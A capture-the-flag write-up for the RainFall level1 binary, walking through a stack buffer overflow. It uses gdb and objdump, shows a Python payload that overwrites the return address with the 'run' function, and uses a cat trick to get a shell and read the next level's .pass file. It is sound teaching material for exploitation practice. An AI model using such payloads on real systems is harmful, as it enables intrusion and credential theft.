First we start by looking the binary file using [dogbolt](https://dogbolt.org/). We can see that we must trigger the `run` function

Lets start simple just by a basic pattern overflow

We will use the pattern :
`aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz`

When executed in gdb we have:

```
(gdb) r
Starting program: /home/user/level1/level1
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x74747474 in ?? ()
```

Here we can see that we overflow on the 4 byte 0x74747474 which are `tttt` in ascii

So we will launch the program the same way but we remove the part starting at `tttt` and put a 4 bytes address to `run` at the position of the overflow instead

Lets find the address of the `run` function:
```SHELL
level1@RainFall:~$ objdump -t level1
...
080497b4 g       *ABS*  00000000              _edata
08048444 g     F .text  0000003c              run
0804854c g     F .fini  00000000              _fini
...
```
The address of `run` : `08048444`
In little endian : `\x44\x84\x04\x08`

But When I do:

```
python -c 'print "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssss" + "\x44\x84\x04\x08"' | ./level1
```

I have :

```
Good... Wait what?
Segmentation fault (core dumped)
```

Here we can see that it enter the run function but we cant use the shell this is because stdin is closed at the end of the program

Now we will put the exploit it in a file :

``` Shell
python -c 'print "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssss" + "\x44\x84\x04\x08"' > /tmp/exploit
```

and execute it with the `-` option for the `cat` command to keep the stdin open

```Shell
cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
```

Since the level1 file belongs to level2 we can now:
```Shell
cat /home/user/level2/.pass
```